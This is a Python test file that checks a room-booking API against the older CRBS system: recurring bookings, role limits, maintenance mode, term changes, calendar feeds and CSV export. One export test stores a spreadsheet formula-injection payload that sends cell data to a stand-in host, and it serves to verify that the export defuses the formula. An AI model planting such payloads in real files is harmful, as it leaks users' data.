"""CRBS parity audit 2026-10-08 — bookings: B1 (replace data loss), B3 (term self-deactivation, computed
current term), B5 (window vs room ACL), B6 (explicit nulls), B7 (group / room order), B9 (CSV formulas),
B11 (ICS time zone), B13 (per-room schedules), B14 (stale group label), B15 (days without periods, CRBS
navigation), B16 (history kept on delete), MISSING 3 (term date change), MISSING 6 (sessions under
setup.sessions) and the deliberate-difference switches (a, b, c, f, g, i, j, scope=all, owner moves).

Real fixture rows (Bahar 2026 weekly grid, published): A 101 Monday 16 Feb: FZT 132 holds P4-P5, P1-P3 free;
A 102 Thursdays P1 free all term; 23 Nisan is a national holiday."""

from __future__ import annotations

import csv
import io
from datetime import date, datetime

from app.core import db as dbmod
from app.models import Block, Booking

from tests.crbs_env import env  # noqa: F401
from tests.crbs_support import role_id

MON = date(2026, 2, 16)
THU = date(2026, 2, 19)


async def _setting(e, **values):  # type: ignore[no-untyped-def]
    r = await e.client.put("/api/v1/org/settings", json=values, headers=e.admin)
    assert r.status_code == 200, r.text


async def _status(booking_id: int) -> str:
    async with dbmod.get_session_factory()() as s:
        b = await s.get(Booking, booking_id)
        assert b is not None
        return b.status


async def _custom_role(e, name: str, perms: list[str]) -> int:  # type: ignore[no-untyped-def]
    r = await e.client.post("/api/v1/roles", json={"name": name, "permissions": perms}, headers=e.admin)
    assert r.status_code == 201, r.text
    return int(r.json()["id"])


# --- B1 --------------------------------------------------------------------------------------------------


async def test_b1_replace_never_cancels_when_something_else_holds_the_slot(env):  # noqa: F811
    _, teacher = await env.user("telafi@uni.edu.tr")
    held = (await env.book(teacher, "A102", date(2026, 3, 5), "P1", notes="PSİ 216 telafi")).json()
    # an admin block (ETKİNLİK) lands on the same slot afterwards
    async with dbmod.get_session_factory()() as s:
        s.add(
            Block(
                term_id=env.term_id,
                room_id=env.rooms["A102"],
                day=4,
                date=date(2026, 3, 5),
                start_period=1,
                end_period=2,
                weeks=[],
                label="ETKİNLİK",
                source="ADMIN",
            )
        )
        await s.commit()
    body = {
        "room_id": env.rooms["A102"],
        "period_id": env.periods["P1"],
        "date": THU.isoformat(),
        "start": THU.isoformat(),
        "end": "2026-03-19",
    }
    prev = (await env.client.post("/api/v1/bookings/recurring/preview", json=body, headers=env.planner)).json()
    inst = {i["date"]: i for i in prev["instances"]}
    assert inst["2026-03-05"]["actions"] == ["do_not_book"]  # the block would win: no "replace" offered
    res = await env.client.post(
        "/api/v1/bookings/recurring",
        json={**body, "instances": [{"date": "2026-03-05", "action": "replace"}]},
        headers=env.planner,
    )
    assert res.status_code == 201, res.text
    out = res.json()
    assert "2026-03-05" not in [b["date"] for b in out["created"]]
    assert await _status(held["id"]) == "BOOKED"  # the teacher's booking was not cancelled


async def test_b1_replace_still_works_when_only_the_old_booking_holds_it(env):  # noqa: F811
    _, teacher = await env.user("degistir@uni.edu.tr")
    held = (await env.book(teacher, "A102", date(2026, 3, 5), "P1")).json()
    body = {
        "room_id": env.rooms["A102"],
        "period_id": env.periods["P1"],
        "date": THU.isoformat(),
        "start": THU.isoformat(),
        "end": "2026-03-12",
        "instances": [{"date": "2026-03-05", "action": "replace"}],
    }
    out = (await env.client.post("/api/v1/bookings/recurring", json=body, headers=env.planner)).json()
    assert "2026-03-05" in [b["date"] for b in out["created"]]
    assert await _status(held["id"]) == "CANCELLED"


# --- deliberate (f): replacements and recur_max_instances --------------------------------------------------


async def test_f_replacements_do_not_count_against_recur_max_unless_switched(env):  # noqa: F811
    _, teacher = await env.user("sayac@uni.edu.tr")
    planner_role = await role_id(env.client, env.admin, "PLANNER")
    await env.client.put(f"/api/v1/roles/{planner_role}", json={"recur_max_instances": 2}, headers=env.admin)
    old = (await env.book(teacher, "A102", THU, "P1")).json()
    body = {
        "room_id": env.rooms["A102"],
        "period_id": env.periods["P1"],
        "date": THU.isoformat(),
        "start": THU.isoformat(),
        "end": "2026-03-19",
        "instances": [{"date": THU.isoformat(), "action": "replace"}],
    }
    out = (await env.client.post("/api/v1/bookings/recurring", json=body, headers=env.planner)).json()
    # CRBS (SingleAgent::create_single_recurring) counts only "book": replace + 2 books
    assert [b["date"] for b in out["created"]] == ["2026-02-19", "2026-02-26", "2026-03-05"]
    await env.client.post(
        f"/api/v1/bookings/{out['created'][0]['id']}/cancel", json={"scope": "all"}, headers=env.planner
    )
    assert await _status(old["id"]) == "CANCELLED"
    old2 = (await env.book(teacher, "A102", THU, "P1")).json()
    await _setting(env, recur_max_counts_replacements=True)
    out = (await env.client.post("/api/v1/bookings/recurring", json=body, headers=env.planner)).json()
    assert [b["date"] for b in out["created"]] == ["2026-02-19", "2026-02-26"]
    assert await _status(old2["id"]) == "CANCELLED"


# --- deliberate (a): max_active_bookings on POST -------------------------------------------------------------


async def test_a_max_active_is_a_grid_rule_in_crbs_and_optional_on_post(env):  # noqa: F811
    teacher_role = await role_id(env.client, env.admin, "TEACHER")
    await env.client.put(f"/api/v1/roles/{teacher_role}", json={"max_active_bookings": 1}, headers=env.admin)
    _, teacher = await env.user("limit.post@uni.edu.tr")
    assert (await env.book(teacher, "A101", MON, "P1")).status_code == 201
    grid = (
        await env.client.get("/api/v1/bookings/grid", params={"display": "day", "date": "2026-02-17"}, headers=teacher)
    ).json()
    assert {s["reason"] for s in grid["slots"] if s["status"] == "unavailable"} >= {"limit"}
    # CRBS: SingleAgent does not re-check the limit
    assert (await env.book(teacher, "A101", MON, "P2")).status_code == 201
    await _setting(env, enforce_max_active_on_create=True)
    third = await env.book(teacher, "A101", MON, "P3")
    assert third.status_code == 409 and third.json()["detail"]["code"] == "max_active_bookings"


# --- deliberate (c): unauthorised user / department ----------------------------------------------------------


async def test_c_unauthorised_set_user_is_403_or_ignored_like_crbs(env):  # noqa: F811
    tid, teacher = await env.user("kendim@uni.edu.tr")
    other_id, _ = await env.user("baskasi@uni.edu.tr")
    r = await env.book(teacher, "A101", MON, "P1", user_id=other_id)
    assert r.status_code == 403 and r.json()["detail"]["code"] == "set_user"
    await _setting(env, ignore_unauthorised_user_department=True)
    r = await env.book(teacher, "A101", MON, "P1", user_id=other_id, department_id=1)
    assert r.status_code == 201, r.text
    assert r.json()["user_id"] == tid and r.json()["department_id"] is None  # booked for herself, own department


# --- deliberate (b): multi-booking recurring department --------------------------------------------------------


async def test_b_multi_recurring_department_uses_book_recur_create_like_crbs(env):  # noqa: F811
    rid = await _custom_role(env, "Seri rezervasyoncu", ["room.view", "book_recur.create"])
    _, user = await env.user("seri@uni.edu.tr", role=None, role_id=rid)
    deps = (await env.client.get("/api/v1/departments", params={"q": "PSİKOLOJİ"}, headers=env.admin)).json()
    psy = next(d for d in deps if d["name"].casefold().startswith("psikoloji"))

    async def multi(period: str):  # type: ignore[no-untyped-def]
        sel = (
            await env.client.post(
                "/api/v1/bookings/multi",
                json={
                    "slots": [{"date": THU.isoformat(), "period_id": env.periods[period], "room_id": env.rooms["A102"]}]
                },
                headers=user,
            )
        ).json()
        return await env.client.post(
            f"/api/v1/bookings/multi/{sel['id']}/create",
            json={
                "type": "recurring",
                "slots": [
                    {"mbs_id": sel["slots"][0]["mbs_id"], "department_id": psy["id"], "recurring_end": "2026-03-05"}
                ],
            },
            headers=user,
        )

    r = await multi("P1")
    assert r.status_code == 200, r.text
    assert r.json()["series"][0]["created"][0]["department_id"] == psy["id"]
    await _setting(env, recurring_department_needs_set_department=True)
    r = await multi("P2")
    assert r.status_code == 403 and r.json()["detail"]["code"] == "set_department"
    # the single-slot recurring form (SingleAgent) always needs set_department, as in CRBS
    r = await env.client.post(
        "/api/v1/bookings/recurring",
        json={
            "room_id": env.rooms["A102"],
            "period_id": env.periods["P6"],
            "date": THU.isoformat(),
            "end": "2026-03-05",
            "department_id": psy["id"],
        },
        headers=user,
    )
    assert r.status_code == 403


# --- deliberate (g): maintenance mode and the lists ---------------------------------------------------------------


async def test_g_maintenance_closes_bookings_but_not_the_dashboard_unless_switched(env):  # noqa: F811
    _, teacher = await env.user("bakim@uni.edu.tr")
    await _setting(env, maintenance_mode=True, maintenance_mode_message="Bakım: 22.00'ye kadar")
    c = env.client
    assert (await c.get("/api/v1/bookings/context", headers=teacher)).status_code == 503
    assert (await c.get("/api/v1/bookings/dashboard", headers=teacher)).status_code == 200
    assert (await c.get("/api/v1/bookings/mine", headers=teacher)).status_code == 200
    assert (await c.get("/api/v1/bookings/feed/user.ics", headers=teacher)).status_code == 200
    await _setting(env, maintenance_gates_lists=True)
    r = await c.get("/api/v1/bookings/dashboard", headers=teacher)
    assert r.status_code == 503 and r.json()["detail"] == "Bakım: 22.00'ye kadar"
    assert (await c.get("/api/v1/bookings/mine", headers=teacher)).status_code == 503
    assert (await c.get("/api/v1/bookings/dashboard", headers=env.admin)).status_code == 200  # bypass


# --- scope=all and owner moves (security differences) -------------------------------------------------------------


async def test_cancel_all_keeps_past_instances_unless_switched(env):  # noqa: F811
    body = {
        "room_id": env.rooms["A102"],
        "period_id": env.periods["P1"],
        "date": THU.isoformat(),
        "start": THU.isoformat(),
        "end": "2026-03-26",
    }
    out = (await env.client.post("/api/v1/bookings/recurring", json=body, headers=env.planner)).json()
    ids = {b["date"]: b["id"] for b in out["created"]}
    env.set_now(datetime(2026, 3, 9, 9, 0))
    r = await env.client.post(
        f"/api/v1/bookings/{ids['2026-03-26']}/cancel", json={"scope": "all"}, headers=env.planner
    )
    assert sorted(r.json()["cancelled"]) == sorted([ids["2026-03-12"], ids["2026-03-19"], ids["2026-03-26"]])
    assert await _status(ids["2026-02-19"]) == "BOOKED"  # history stays
    out = (
        await env.client.post(
            "/api/v1/bookings/recurring",
            json={**body, "period_id": env.periods["P2"], "start": None, "end": None, "date": "2026-03-12"},
            headers=env.planner,
        )
    ).json()
    await _setting(env, cancel_all_includes_past=True)
    env.set_now(datetime(2026, 4, 1, 9, 0))
    first = out["created"][0]
    r = await env.client.post(f"/api/v1/bookings/{first['id']}/cancel", json={"scope": "all"}, headers=env.planner)
    assert len(r.json()["cancelled"]) == len(out["created"])  # CRBS cancel_all: every instance


async def test_owner_cannot_move_a_booking_into_the_past_or_beyond_range_max(env):  # noqa: F811
    teacher_role = await role_id(env.client, env.admin, "TEACHER")
    await env.client.put(f"/api/v1/roles/{teacher_role}", json={"range_max": 10}, headers=env.admin)
    _, teacher = await env.user("tasiyici@uni.edu.tr")
    b = (await env.book(teacher, "A101", date(2026, 2, 17), "P1")).json()
    c = env.client
    past = await c.put(f"/api/v1/bookings/{b['id']}", json={"date": "2026-02-13"}, headers=teacher)
    assert past.status_code == 409 and past.json()["detail"]["code"] == "range_min"
    far = await c.put(f"/api/v1/bookings/{b['id']}", json={"date": "2026-03-30"}, headers=teacher)
    assert far.status_code == 409 and far.json()["detail"]["code"] == "range_max"
    ok = await c.put(f"/api/v1/bookings/{b['id']}", json={"date": MON.isoformat()}, headers=teacher)
    assert ok.status_code == 200, ok.text
    # an administrator (role-level edit_other_booking) is not limited
    assert (
        await c.put(f"/api/v1/bookings/{b['id']}", json={"date": "2026-03-30"}, headers=env.admin)
    ).status_code == 200


# --- B5, B6 --------------------------------------------------------------------------------------------------------


async def test_b5_window_uses_the_room_acl_like_the_grid(env):  # noqa: F811
    tid, teacher = await env.user("acl.seri@uni.edu.tr")
    await env.client.post(
        "/api/v1/room-admin/acl",
        json={
            "entity_type": "room",
            "entity_id": env.rooms["A102"],
            "context_type": "user",
            "context_id": tid,
            "permissions": ["book_recur.create"],
        },
        headers=env.admin,
    )
    fri = date(2026, 2, 12)  # last Thursday (A 102 P1 is free all term): in the past
    grid = (
        await env.client.get(
            "/api/v1/bookings/grid",
            params={"display": "room", "date": fri.isoformat(), "room_id": env.rooms["A102"]},
            headers=teacher,
        )
    ).json()
    slot = next(s for s in grid["slots"] if s["date"] == fri.isoformat() and s["period_id"] == env.periods["P1"])
    assert slot["status"] == "available"
    r = await env.book(teacher, "A102", fri, "P1")
    assert r.status_code == 201, r.text  # what the grid offered is bookable


async def test_b6_explicit_nulls_are_422(env):  # noqa: F811
    _, teacher = await env.user("bos.alan@uni.edu.tr")
    b = (await env.book(teacher, "A101", MON, "P1")).json()
    for field in ("date", "period_id", "room_id"):
        r = await env.client.put(f"/api/v1/bookings/{b['id']}", json={field: None}, headers=teacher)
        assert r.status_code == 422, (field, r.text)
    r = await env.client.put(f"/api/v1/bookings/{b['id']}", json={"notes": None}, headers=teacher)
    assert r.status_code == 200  # clearing the notes is fine


# --- B7, B13, B14, B15 ------------------------------------------------------------------------------------------------


async def test_b7_grid_follows_group_and_room_positions(env):  # noqa: F811
    c = env.client
    b = (
        await c.post(
            "/api/v1/room-admin/groups", json={"name": "B Blok", "room_ids": [env.rooms["B201"]]}, headers=env.admin
        )
    ).json()
    a = (
        await c.post(
            "/api/v1/room-admin/groups",
            json={"name": "A Blok", "room_ids": [env.rooms["A101"], env.rooms["A102"]]},
            headers=env.admin,
        )
    ).json()
    await c.put("/api/v1/room-admin/groups/order", json={"ids": [a["id"], b["id"]]}, headers=env.admin)
    await c.put(
        "/api/v1/room-admin/rooms/order", json={"ids": [env.rooms["A102"], env.rooms["A101"]]}, headers=env.admin
    )
    await _setting(env, show_ungrouped_rooms=False)
    _, teacher = await env.user("sira@uni.edu.tr")
    grid = (await c.get("/api/v1/bookings/grid", params={"date": MON.isoformat()}, headers=teacher)).json()
    assert grid["room_group_id"] == a["id"]
    assert [r["name"] for r in grid["rooms"]] == ["A 102", "A 101"]
    rooms = (await c.get("/api/v1/bookings/rooms", headers=teacher)).json()
    assert [r["code"] for r in rooms] == ["A102", "A101", "B201"]


async def test_b13_rooms_keep_their_own_schedule_without_room_groups(env):  # noqa: F811
    c = env.client
    a = (
        await c.post(
            "/api/v1/room-admin/groups", json={"name": "A Blok", "room_ids": [env.rooms["A101"]]}, headers=env.admin
        )
    ).json()
    b = (
        await c.post(
            "/api/v1/room-admin/groups", json={"name": "B Blok", "room_ids": [env.rooms["B201"]]}, headers=env.admin
        )
    ).json()
    evening = (
        await c.post("/api/v1/booking-admin/schedules", json={"name": "İkinci öğretim"}, headers=env.admin)
    ).json()
    p = (
        await c.post(
            f"/api/v1/booking-admin/schedules/{evening['id']}/periods",
            json={"name": "Akşam 1", "time_start": "18.00", "time_end": "18.40", "days": [1, 2, 3, 4, 5]},
            headers=env.admin,
        )
    ).json()
    await c.put(
        f"/api/v1/booking-admin/sessions/{env.term_id}/schedules",
        json=[
            {"room_group_id": a["id"], "schedule_id": env.schedule_id},
            {"room_group_id": b["id"], "schedule_id": evening["id"]},
        ],
        headers=env.admin,
    )
    await _setting(env, use_room_groups=False)
    grid = (await c.get("/api/v1/bookings/grid", params={"date": MON.isoformat()}, headers=env.planner)).json()
    slots = {(s["room_id"], s["period_id"]): s for s in grid["slots"]}
    assert {x["id"] for x in grid["periods"]} >= {env.periods["P1"], p["id"]}
    assert slots[(env.rooms["B201"], p["id"])]["status"] in ("available", "timetable", "booked")
    assert slots[(env.rooms["B201"], env.periods["P1"])]["reason"] == "schedule"
    assert slots[(env.rooms["A101"], p["id"])]["reason"] == "schedule"
    assert slots[(env.rooms["A101"], env.periods["P1"])]["status"] == "available"


async def test_b14_clearing_a_group_clears_the_legacy_label(env):  # noqa: F811
    from app.models.catalog import Room

    c = env.client
    g = (
        await c.post(
            "/api/v1/room-admin/groups",
            json={"name": "Laboratuvar", "room_ids": [env.rooms["A103"], env.rooms["A104"]]},
            headers=env.admin,
        )
    ).json()
    await c.put(f"/api/v1/room-admin/rooms/{env.rooms['A103']}", json={"room_group_id": None}, headers=env.admin)
    await c.put(f"/api/v1/room-admin/groups/{g['id']}", json={"room_ids": []}, headers=env.admin)
    async with dbmod.get_session_factory()() as s:
        for code in ("A103", "A104"):
            r = await s.get(Room, env.rooms[code])
            assert r is not None and r.room_group_id is None and r.room_group is None, code


async def test_b15_week_view_hides_days_without_periods_and_navigates_like_crbs(env):  # noqa: F811
    c = env.client
    for pid in env.periods.values():  # weekday-only teaching (the evening programme keeps no weekend periods)
        await c.put(f"/api/v1/booking-admin/periods/{pid}", json={"days": [1, 2, 3, 4, 5]}, headers=env.admin)
    await c.post(
        "/api/v1/holidays",
        json={
            "term_id": env.term_id,
            "name": "Kurban Bayramı arifesi",
            "date_start": "2026-02-23",
            "date_end": "2026-02-23",
        },
        headers=env.admin,
    )
    _, teacher = await env.user("hafta@uni.edu.tr")
    week = (
        await c.get(
            "/api/v1/bookings/grid",
            params={"display": "room", "date": MON.isoformat(), "room_id": env.rooms["A101"]},
            headers=teacher,
        )
    ).json()
    assert [d["date"] for d in week["dates"]] == ["2026-02-16", "2026-02-17", "2026-02-18", "2026-02-19", "2026-02-20"]
    assert {s["date"] for s in week["slots"]} == {d["date"] for d in week["dates"]}
    assert week["nav"]["next"] == "2026-02-23" and week["nav"]["prev"] == "2026-02-09"
    fri = (
        await c.get("/api/v1/bookings/grid", params={"display": "day", "date": "2026-02-20"}, headers=teacher)
    ).json()
    assert fri["nav"]["next"] == "2026-02-24"  # skips the weekend and the holiday
    assert fri["nav"]["prev"] == "2026-02-19"


# --- B16 --------------------------------------------------------------------------------------------------------------


async def test_b16_deleting_a_period_or_room_keeps_booking_history(env):  # noqa: F811
    _, teacher = await env.user("gecmis@uni.edu.tr")
    b = (await env.book(teacher, "A101", MON, "P1")).json()
    await env.client.post(f"/api/v1/bookings/{b['id']}/cancel", json={}, headers=teacher)
    r = await env.client.delete(f"/api/v1/booking-admin/periods/{env.periods['P1']}", headers=env.admin)
    assert r.status_code == 409 and "1 booking" in r.text
    r = await env.client.delete(f"/api/v1/booking-admin/schedules/{env.schedule_id}", headers=env.admin)
    assert r.status_code == 409
    live = (await env.book(teacher, "A102", THU, "P1")).json()
    r = await env.client.delete(f"/api/v1/rooms/{env.rooms['A102']}", headers=env.planner)
    assert r.status_code == 409 and r.json()["detail"]["active_bookings"] == 1
    assert await _status(b["id"]) == "CANCELLED" and await _status(live["id"]) == "BOOKED"
    # a room without any booking can still be deleted
    assert (await env.client.delete(f"/api/v1/rooms/{env.rooms['D107']}", headers=env.planner)).status_code == 204


# --- B9, B11, (j) export -------------------------------------------------------------------------------------------------


async def test_b9_j_export_neutralises_formulas_and_follows_room_groups(env):  # noqa: F811
    _, teacher = await env.user("formul@uni.edu.tr")
    await env.book(teacher, "A101", MON, "P1", notes='=HYPERLINK("http://kotu.example/?"&A1,"İndir")')
    await env.book(teacher, "A102", THU, "P1", notes="@SUM(1+1) ders")
    await env.client.post(
        "/api/v1/room-admin/groups", json={"name": "A Blok", "room_ids": [env.rooms["A101"]]}, headers=env.admin
    )

    async def rows() -> list[dict[str, str]]:
        r = await env.client.get("/api/v1/bookings/export.csv", params={"term_id": env.term_id}, headers=env.planner)
        return list(csv.DictReader(io.StringIO(r.content.decode("utf-8-sig"))))

    got = await rows()
    assert [x["Room"] for x in got] == ["A 101"]  # CRBS: ungrouped A 102 is not exported
    assert got[0]["Notes"].startswith("'=HYPERLINK") and got[0]["Room Group"] == "A Blok"
    await _setting(env, export_ungrouped_rooms=True)
    got = await rows()
    assert [x["Room"] for x in got] == ["A 101", "A 102"] and got[1]["Notes"] == "'@SUM(1+1) ders"


async def test_b11_ics_uses_the_timezone_setting(env):  # noqa: F811
    _, teacher = await env.user("saat.dilimi@uni.edu.tr")
    await env.book(teacher, "A101", MON, "P1")
    text = (await env.client.get("/api/v1/bookings/feed/user.ics", headers=teacher)).text.replace("\r\n ", "")
    assert "BEGIN:VTIMEZONE" in text and "TZID:Europe/Istanbul" in text and "TZOFFSETTO:+0300" in text
    assert "DTSTART;TZID=Europe/Istanbul:20260216T083000" in text
    await _setting(env, timezone="Europe/Berlin")  # has daylight saving: times are written in UTC
    text = (await env.client.get("/api/v1/bookings/feed/user.ics", headers=teacher)).text
    assert "X-WR-TIMEZONE:Europe/Berlin" in text and "DTSTART:20260216T073000Z" in text
    assert "Europe/Istanbul" not in text


# --- B3 / (i), MISSING 3, MISSING 6 ---------------------------------------------------------------------------------------


async def test_b3_new_active_term_keeps_its_flag_and_current_is_computed_from_dates(env):  # noqa: F811
    c = env.client
    r = await c.post(
        "/api/v1/terms",
        json={
            "code": "2026-YAZ",
            "name": "2026 Yaz Okulu",
            "start_date": "2026-07-01",
            "end_date": "2026-08-28",
            "is_active": True,
        },
        headers=env.planner,
    )
    assert r.status_code == 201 and r.json()["is_active"] is True, r.text
    yaz = r.json()["id"]
    sessions = {s["term_id"]: s for s in (await c.get("/api/v1/booking-admin/sessions", headers=env.admin)).json()}
    assert sessions[env.term_id]["is_current"] is True  # 16 Feb is inside Bahar (CRBS auto_set_current)
    assert sessions[yaz]["is_current"] is False
    _, teacher = await env.user("donem@uni.edu.tr")
    ctx = (await c.get("/api/v1/bookings/context", headers=teacher)).json()
    assert ctx["current_term_id"] == env.term_id
    await _setting(env, manual_current_term=True)
    sessions = {s["term_id"]: s for s in (await c.get("/api/v1/booking-admin/sessions", headers=env.admin)).json()}
    assert sessions[yaz]["is_current"] is True and sessions[env.term_id]["is_current"] is False


async def test_missing3_shrinking_a_term_cancels_or_asks_about_bookings_outside(env):  # noqa: F811
    c = env.client
    _, teacher = await env.user("donem.sonu@uni.edu.tr")
    inside = (await env.book(teacher, "A101", date(2026, 2, 17), "P1")).json()
    outside = (await env.book(env.planner, "A102", date(2026, 5, 28), "P1")).json()
    term = (await c.get(f"/api/v1/terms/{env.term_id}", headers=env.planner)).json()
    await _setting(env, term_date_change="confirm")
    r = await c.put(f"/api/v1/terms/{env.term_id}", json={"end_date": "2026-05-22"}, headers=env.planner)
    assert r.status_code == 409, r.text
    assert [b["id"] for b in r.json()["detail"]["bookings"]] == [outside["id"]]
    assert (await c.get(f"/api/v1/terms/{env.term_id}", headers=env.planner)).json()["end_date"] == term["end_date"]
    r = await c.put(
        f"/api/v1/terms/{env.term_id}", params={"confirm": "true"}, json={"end_date": "2026-05-22"}, headers=env.planner
    )
    assert r.status_code == 200 and r.json()["cancelled_booking_ids"] == [outside["id"]]
    async with dbmod.get_session_factory()() as s:
        gone = await s.get(Booking, outside["id"])
        assert gone.status == "CANCELLED" and "22.05.2026" in (gone.cancel_reason or "")
    assert await _status(inside["id"]) == "BOOKED"
    # CRBS default: cancelled at once with a reason
    await _setting(env, term_date_change="cancel")
    late = (await env.book(env.planner, "A102", date(2026, 5, 21), "P1")).json()
    r = await c.put(f"/api/v1/terms/{env.term_id}", json={"end_date": "2026-05-15"}, headers=env.planner)
    assert r.status_code == 200 and r.json()["cancelled_booking_ids"] == [late["id"]]


async def test_missing6_setup_sessions_may_create_and_delete_terms(env):  # noqa: F811
    rid = await _custom_role(env, "Dönem yöneticisi", ["setup.sessions"])
    _, clerk = await env.user("donem.yonetici@uni.edu.tr", role=None, role_id=rid)
    c = env.client
    r = await c.post(
        "/api/v1/terms",
        json={"code": "2026-2027 GÜZ", "start_date": "2026-09-21", "end_date": "2027-01-15"},
        headers=clerk,
    )
    assert r.status_code == 201, r.text
    tid = r.json()["id"]
    assert (
        await c.put(f"/api/v1/terms/{tid}", json={"name": "2026-2027 Güz Dönemi"}, headers=clerk)
    ).status_code == 200
    assert (await c.delete(f"/api/v1/terms/{tid}", headers=clerk)).status_code == 204
    _, teacher = await env.user("yetkisiz.donem@uni.edu.tr")
    assert (await c.post("/api/v1/terms", json={"code": "X"}, headers=teacher)).status_code == 403


async def test_dashboard_totals_use_the_current_term(env):  # noqa: F811
    _, teacher = await env.user("toplam@uni.edu.tr")
    await env.book(teacher, "A101", MON, "P1")
    dash = (await env.client.get("/api/v1/bookings/dashboard", headers=teacher)).json()
    assert dash["totals"]["session"] == 1
